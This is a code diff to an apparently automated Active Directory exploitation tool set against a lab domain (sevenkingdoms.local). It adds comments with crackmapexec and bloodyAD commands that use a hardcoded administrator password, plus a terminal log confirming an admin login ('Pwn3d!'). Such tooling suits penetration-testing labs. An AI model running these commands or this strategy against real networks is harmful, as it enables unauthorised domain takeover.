@@ -1,4 +1,6 @@
 # strategies/generic_write.py
+# Check with : crackmapexec smb 192.168.56.10 -u ADMINISTRATOR -p 'AutoPwn@1337!' -d sevenkingdoms.local
+# bloodyAD -H 192.168.56.10 -d sevenkingdoms.local -u ADMINISTRATOR -p 'AutoPwn@1337!' get object ADMINISTRATOR --attr pwdLastSet
 
 from dataclasses import dataclass
 from .exploit_strategy import ExploitStrategy
@@ -219,4 +221,20 @@ def _bloodyad(creds: dict, subcommand: list[str]) -> list[str]:
                 "dc_ip": creds.get("dc_ip")
             }
         )
+"""
+
+
+"""
+rania@DELL:~$ crackmapexec smb 192.168.56.10 -u ADMINISTRATOR -p 'AutoPwn@1337!' -d sevenkingdoms.local
+[*] First time use detected
+[*] Creating home directory structure
+[*] Creating missing folder logs
+[*] Creating missing folder modules
+[*] Creating missing folder protocols
+[*] Creating missing folder workspaces
+[*] Creating missing folder obfuscated_scripts
+[*] Creating missing folder screenshots
+[*] Copying default configuration file
+SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         192.168.56.10   445    KINGSLANDING     [+] sevenkingdoms.local\ADMINISTRATOR:AutoPwn@1337! (Pwn3d!)
 """
